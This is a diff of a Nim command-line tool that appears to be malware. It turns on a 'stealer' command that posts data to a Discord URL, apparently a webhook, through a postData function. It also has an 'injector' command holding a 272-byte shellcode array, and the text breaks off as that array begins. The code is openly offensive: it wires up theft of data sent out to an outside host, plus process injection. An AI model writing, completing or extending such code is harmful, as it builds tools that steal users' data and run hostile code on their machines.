@@ -3,24 +3,24 @@ import argparse, re
 import discord/discord as d
 import injection/injection
 
-# proc validateUrl(url: string): bool=
-#     let pattern = re"^https?://[^\s/$.?#].[^\s]*$"
-#     return url.match(pattern)
+proc validateUrl(url: string): bool=
+    let pattern = re"^https?://[^\s/$.?#].[^\s]*$"
+    return url.match(pattern)
 
 proc main() = 
     var p = newParser():
         command("injector"):
             arg("name")
-        # command("stealer"):
-        #     option("-d", "--discord", required=true)
+        command("stealer"):
+            option("-d", "--discord", required=true)
 
     let opts = p.parse()
-    # if opts.command == "stealer":
-    #     let url = opts.stealer.get.discord
-    #     if not validateUrl(url):
-    #         quit("Non valid url",1)
+    if opts.command == "stealer":
+        let url = opts.stealer.get.discord
+        if not validateUrl(url):
+            quit("Non valid url",1)
         
-    #     d.postData(url)
+        d.postData(url)
     
     if opts.command == "injector":
         var shellcode: array[272, byte] = [
